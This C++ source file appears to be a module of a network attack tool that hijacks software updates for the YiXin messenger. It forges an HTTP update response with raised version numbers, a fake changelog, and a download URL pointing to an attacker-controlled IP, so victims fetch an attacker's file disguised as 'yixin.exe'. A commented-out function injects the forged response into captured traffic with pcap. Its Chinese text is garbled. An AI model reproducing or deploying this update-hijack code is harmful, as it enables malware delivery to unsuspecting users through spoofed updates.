
#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "yixin.h"
#include <iostream>
#include "../HttpUtils.h"

#include <string>
using namespace std;



int YiXin::prepareRespData(DWORD ulIP, string filepath, string filename) {

	int version = 1264;		//1263
	int majorver = 5;		//4
	int minorver = 4;		//3
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nAccept-Ranges: bytes\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsFormat =
		"{\"os\":\"windows\",\"baseSdk\":502,\"title\":\"����\","
		"\"description\":\"1. �����ϲ��Ự���ڹ���\n2. �����ղر���ķ��͹���\n3. �Ż���������Ƶͨ������\n4. �Ż���һЩ����ϸ��\", "
		"\"notify\":\"false\",\"fileName\":\"%s\",\"versionCode\":%u,\"majorVersion\":%u,\"minorVersion\":%u,"
		"\"md5\":\"%s\","
		"\"downloadUrl\":\"http://%s/%s\",\"length\":%u}\r\n\r\n";

	int ret = FALSE;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename,TRUE);

	char lpJs[MAX_RESPONSE_HEADER_SIZE];
	int iJsLen = sprintf_s(lpJs, MAX_RESPONSE_HEADER_SIZE, jsFormat, "yixin.exe"/*filename.c_str()*/,version,majorver,minorver, m_szmd5,
		szip.c_str(), filename.c_str(), m_filesize);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsLen, lpJs);

	return m_iRespSize;
}



/*
int YiXin::sendRespData(pcap_t * pcap, unsigned char * lppacket, int packetsize, char * flag) {
	int ret = 0;
	if (*m_lpResp && m_iRespSize)
	{
		ret = ReplacePacket(pcap, (unsigned char*)lppacket, packetsize, lpResp, iRespSize, flag);
	}

	return ret;
}*/